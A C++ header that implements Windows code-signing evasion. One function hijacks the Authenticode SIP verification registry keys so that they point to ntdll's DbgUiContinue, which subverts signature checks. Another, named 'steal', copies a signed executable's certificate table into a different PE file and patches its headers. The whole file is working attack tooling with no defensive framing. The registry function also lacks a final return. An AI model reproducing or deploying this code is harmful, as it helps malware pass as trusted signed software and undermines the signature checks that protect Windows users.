#pragma once

#include <windows.h>
#include <cstdint>
#include <fstream>
#include <iostream>
#include <string>
#include <vector>

struct WIN_CERTIFICATE {
    uint32_t dwLength;
    uint16_t wRevision;
    uint16_t wCertificateType;
};


bool SetRegistryValues(HKEY rootKey, LPCWSTR subkey, LPCWSTR dllPath, LPCWSTR funcName, REGSAM accessFlag) {
    HKEY hKey;
    LONG result = RegOpenKeyExW(rootKey, subkey, 0, KEY_SET_VALUE | accessFlag, &hKey);
    if (result != ERROR_SUCCESS) {
        std::wcerr << L"Failed to open key: " << subkey << L" (Error " << result << L")" << std::endl;
        return false;
    }

    result = RegSetValueExW(hKey, L"Dll", 0, REG_SZ, reinterpret_cast<const BYTE*>(dllPath), (DWORD)((wcslen(dllPath) + 1) * sizeof(wchar_t)));
    if (result != ERROR_SUCCESS) {
        std::wcerr << L"Failed to set 'Dll' value. Error: " << result << std::endl;
        RegCloseKey(hKey);
        return false;
    }

    result = RegSetValueExW(hKey, L"FuncName", 0, REG_SZ, reinterpret_cast<const BYTE*>(funcName), (DWORD)((wcslen(funcName) + 1) * sizeof(wchar_t)));
    if (result != ERROR_SUCCESS) {
        std::wcerr << L"Failed to set 'FuncName' value. Error: " << result << std::endl;
        RegCloseKey(hKey);
        return false;
    }

    RegCloseKey(hKey);
    // std::wcout << L"Successfully updated: " << subkey << std::endl;
    return true;
}

bool hook_registry()
{
    LPCWSTR dllPath = L"C:\\Windows\\System32\\ntdll.dll";
    LPCWSTR funcName = L"DbgUiContinue";

    // 64-bit registry
    LPCWSTR subkey64 = L"SOFTWARE\\Microsoft\\Cryptography\\OID\\EncodingType 0\\CryptSIPDllVerifyIndirectData\\{C689AAB8-8E78-11D0-8C47-00C04FC295EE}";
    // 32-bit registry
    LPCWSTR subkey32 = L"SOFTWARE\\WOW6432Node\\Microsoft\\Cryptography\\OID\\EncodingType 0\\CryptSIPDllVerifyIndirectData\\{C689AAB8-8E78-11D0-8C47-00C04FC295EE}";

    if (!SetRegistryValues(HKEY_LOCAL_MACHINE, subkey64, dllPath, funcName, KEY_WOW64_64KEY))
        return false;

    if (!SetRegistryValues(HKEY_LOCAL_MACHINE, subkey32, dllPath, funcName, KEY_WOW64_32KEY))
        return false;
}

static inline uint64_t align8(uint64_t x) {
    return (x + 7) & ~7ULL;
}

bool steal(const std::string& src_path, const std::string& dst_path) {
    // 1) Open source and read headers
    std::ifstream src(src_path, std::ios::binary);
    if (!src) return false;

    IMAGE_DOS_HEADER dos;
    src.read(reinterpret_cast<char*>(&dos), sizeof(dos));
    if (dos.e_magic != 0x5A4D) return false;  // not MZ

    src.seekg(dos.e_lfanew, std::ios::beg);
    IMAGE_NT_HEADERS64 nt;
    src.read(reinterpret_cast<char*>(&nt), sizeof(nt));
    if (nt.Signature != 0x00004550) return false;  // not PE\0\0

    auto certDir = nt.OptionalHeader.DataDirectory[4];
    if (certDir.VirtualAddress == 0 || certDir.Size == 0) {
        // no certificate table
        return false;
    }

    // 2) Read the entire certificate table in one blob
    std::vector<char> blob(certDir.Size);
    src.seekg(certDir.VirtualAddress, std::ios::beg);
    src.read(blob.data(), blob.size());
    src.close();

    // 3) Append to dst with 8-byte alignment
    std::fstream dst(dst_path,
        std::ios::binary | std::ios::in | std::ios::out);
    if (!dst) return false;

    dst.seekg(0, std::ios::end);
    uint64_t eof = dst.tellg();
    uint64_t writeOff = align8(eof);
    if (writeOff > eof) {
        std::vector<char> pad(writeOff - eof, 0);
        dst.write(pad.data(), (std::streamsize)pad.size());
    }

    dst.write(blob.data(), (std::streamsize)blob.size());

    // 4) Patch DataDirectory[4] in the target PE
    IMAGE_DOS_HEADER dos2;
    dst.seekg(0, std::ios::beg);
    dst.read(reinterpret_cast<char*>(&dos2), sizeof(dos2));

    // compute base of DataDirectory array
    uint32_t ddBase = dos2.e_lfanew
        + 4                                          // Signature
        + sizeof(IMAGE_FILE_HEADER)
        + offsetof(IMAGE_OPTIONAL_HEADER64, DataDirectory);

    // entry #4 (zero-based) is the security directory
    uint32_t dd4 = ddBase + 4 * sizeof(IMAGE_DATA_DIRECTORY);

    // write VirtualAddress (file offset) then Size
    dst.seekp(dd4 + offsetof(IMAGE_DATA_DIRECTORY, VirtualAddress),
        std::ios::beg);
    uint32_t off32 = static_cast<uint32_t>(writeOff);
    dst.write(reinterpret_cast<const char*>(&off32), sizeof(off32));

    uint32_t size32 = certDir.Size;
    dst.write(reinterpret_cast<const char*>(&size32), sizeof(size32));

    dst.close();
    return true;
}
